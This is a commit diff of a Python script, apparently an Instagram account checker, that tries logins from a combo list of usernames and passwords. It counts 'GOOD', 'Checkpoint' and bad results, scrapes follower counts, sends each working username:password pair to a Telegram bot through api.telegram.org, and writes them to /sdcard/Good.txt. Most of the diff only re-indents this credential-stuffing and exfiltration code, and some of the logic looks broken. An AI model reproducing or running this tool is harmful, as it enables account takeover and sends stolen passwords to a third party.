28c27eb0a4de3ec87db9b032a1b995040df02b51
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-22 05:35:58 +0300

    Update .insta.py

--- .insta.py
+++ .insta.py
@@ -297,123 +297,119 @@ def instagram1():
                         	    'x-instagram-ajax': '1cb44f68ffec',
                         	    'x-requested-with': 'XMLHttpRequest'
                         	}
-					data_login = {
+						data_login = {
                         	    'username': username_login,
                         	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password_login}',
                         	    'queryParams': '{}',
                         	    'optIntoOneTap': 'false'
                         	}
-					req_login = requests.post(url_login, data=data_login, headers=headers_login)
-					if '"authenticated":false' in req_login.text:
-						print(" - Halla haya la xoto mar krdn\n")
-						exit(0)
-					elif '"authenticated":true' in req_login.text:
-						print('Login Akat Sar Kawtw Bw..\n')
-						sessd = req_login.cookies['sessionid']
-						for file in range(1):
-							url_checker = 'https://www.instagram.com/accounts/login/ajax/'
-							headers_checker = {
-                        	            'accept': '*/*',
-                        	            'accept-encoding': 'gzip, deflate, br',
-                        	            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-                        	            'content-length': '291',
-                        	            'content-type': 'application/x-www-form-urlencoded',
-                        	            'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
-                        	            'origin': 'https://www.instagram.com',
-                        	            'referer': 'https://www.instagram.com/',
-                        	            'sec-fetch-dest': 'empty',
-                        	            'sec-fetch-mode': 'cors',
-                        	            'sec-fetch-site': 'same-origin',
-                        	            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
-                        	            'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
-                        	            'x-ig-app-id': '936619743392459',
-                        	            'x-ig-www-claim': '0',
-                        	            'x-instagram-ajax': '1cb44f68ffec',
-                        	            'x-requested-with': 'XMLHttpRequest'
-                        	        }
-					data_checker = {
-                        	            'username': "ddddddddddddddddddddddddddddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-                        	            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
-                        	            'queryParams': '{}',
-                        	            'optIntoOneTap': 'false'
-                        	        }
-					req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
-					if '"user":false' in req:
-						url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
-						headers_get_info = {
-                        	                'accept': '*/*',
-                        	                'accept-encoding': 'gzip, deflate, br',
-                        	                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-                        	                'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
-                        	                'referer': 'https://www.instagram.com/accounts/edit/',
-                        	                'sec-fetch-dest': 'empty',
-                        	                'sec-fetch-mode': 'cors',
-                        	                'sec-fetch-site': 'same-origin',
-                        	                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
-                        	                'x-ig-app-id': '936619743392459',
-                        	                'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
-                        	                'x-requested-with': 'XMLHttpRequest'
-                        	            }
-					data_get_info = {
-                        	                '__a': '1'
-                        	            }
-					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
-					first_name = str(req_get_info.json()['form_data']['username'])
-					print(first_name)
-					def script():
-						try:
-							username = first_name
-						except:
-							print("Something Error!! Retry")
+						req_login = requests.post(url_login, data=data_login, headers=headers_login)
+						if '"authenticated":false' in req_login.text:
+							print(" - Halla haya la xoto mar krdn\n")
+							exit(0)
+						elif '"authenticated":true' in req_login.text:
+							print('Login Akat Sar Kawtw Bw..\n')
+							sessd = req_login.cookies['sessionid']
+							for file in range(1):
+								url_checker = 'https://www.instagram.com/accounts/login/ajax/'
+								headers_checker = {
+	                        	            'accept': '*/*',
+	                        	            'accept-encoding': 'gzip, deflate, br',
+	                        	            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	                        	            'content-length': '291',
+	                        	            'content-type': 'application/x-www-form-urlencoded',
+	                        	            'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
+	                        	            'origin': 'https://www.instagram.com',
+	                        	            'referer': 'https://www.instagram.com/',
+	                        	            'sec-fetch-dest': 'empty',
+	                        	            'sec-fetch-mode': 'cors',
+	                        	            'sec-fetch-site': 'same-origin',
+	                        	            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
+	                        	            'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
+	                        	            'x-ig-app-id': '936619743392459',
+	                        	            'x-ig-www-claim': '0',
+	                        	            'x-instagram-ajax': '1cb44f68ffec',
+	                        	            'x-requested-with': 'XMLHttpRequest'
+	                        	        }
+						data_checker = {
+	                        	            'username': "ddddddddddddddddddddddddddddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+	                        	            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
+	                        	            'queryParams': '{}',
+	                        	            'optIntoOneTap': 'false'
+	                        	        }
+						req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
+						if '"user":false' in req:
+							url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+							headers_get_info = {
+	                        	                'accept': '*/*',
+	                        	                'accept-encoding': 'gzip, deflate, br',
+	                        	                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+	                        	                'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
+	                        	                'referer': 'https://www.instagram.com/accounts/edit/',
+	                        	                'sec-fetch-dest': 'empty',
+	                        	                'sec-fetch-mode': 'cors',
+	                        	                'sec-fetch-site': 'same-origin',
+	                        	                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
+	                        	                'x-ig-app-id': '936619743392459',
+	                        	                'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
+	                        	                'x-requested-with': 'XMLHttpRequest'
+	                        	            }
+						data_get_info = {
+	                        	                '__a': '1'
+	                        	            }
+						req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
+						first_name = str(req_get_info.json()['form_data']['username'])
+						print(first_name)
+						def script():
+							try:
+								username = first_name
+							except:
+								print("Something Error!! Retry")
+								script()
+							url = f"https://www.instagram.com/{username}?hl=en"
+							r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+							s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
+							soup = BeautifulSoup(r,'html.parser')
+							meta = soup.find("meta")
+							name = soup.find("meta", property="og:title")
+							name = name["content"].split("(")[0]
+							link_url = soup.find("meta", property="og:url")
+							profile_pic = soup.find("meta", property="og:image")
+							description = soup.find("meta", property="og:description")
+							followers = description["content"].split(",")[0]
+							following = description["content"].split(",")[1]
+							posts = description["content"].split(",")[2].split("-")[0]
+							ouput(username,name,following,followers,posts,link_url,profile_pic)
+							def ouput(username,name,following,followers,posts,link_url,profile_pic):
+								print("\nUserName: "+username)
+								print("\nName: "+name)
+								print("\nFollowers: "+followers)
+								print("\nFollowing: "+following)
+								print("\nPosts: "+posts)
+								print()
 							script()
-						url = f"https://www.instagram.com/{username}?hl=en"
-						r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
-						s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
-						soup = BeautifulSoup(r,'html.parser')
-						meta = soup.find("meta")
-						name = soup.find("meta", property="og:title")
-						name = name["content"].split("(")[0]
-						link_url = soup.find("meta", property="og:url")
-						profile_pic = soup.find("meta", property="og:image")
-						description = soup.find("meta", property="og:description")
-						followers = description["content"].split(",")[0]
-						following = description["content"].split(",")[1]
-						posts = description["content"].split(",")[2].split("-")[0]
-						ouput(username,name,following,followers,posts,link_url,profile_pic)
-						def ouput(username,name,following,followers,posts,link_url,profile_pic):
-							print("\nUserName: "+username)
-							print("\nName: "+name)
-							print("\nFollowers: "+followers)
-							print("\nFollowing: "+following)
-							print("\nPosts: "+posts)
-							print()
-							script()
-                        except:
-                            pass
-                        ##########
-                        ##########
-		    			os.system("clear")
-		    			print(logo2)
-		    			hits+=1
-		    			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-		    			boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
-		    			r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
-		    			with open('/sdcard/Good.txt', 'a') as ff:
-		    				ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
-		    		elif ('"message":"checkpoint_required"') in login:
-		    			os.system("clear")
-		    			print(logo2)
-		    			checkpoint+=1
-		    			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-		    		else:
-		    			os.system("clear")
-		    			print(logo2)
-		    			error+=1
-		    			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-                except:
-		    		print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-        except FileNotFoundError:
-            print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
+							os.system("clear")
+							print(logo2)
+							hits+=1
+							print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+							boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+							r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
+							with open('/sdcard/Good.txt', 'a') as ff:
+								ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+					elif ('"message":"checkpoint_required"') in login:
+						os.system("clear")
+						print(logo2)
+						checkpoint+=1
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+					else:
+						os.system("clear")
+						print(logo2)
+						error+=1
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+				except:
+					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+		except FileNotFoundError:
+			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
 	loopPp()
 	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 def dwbara():
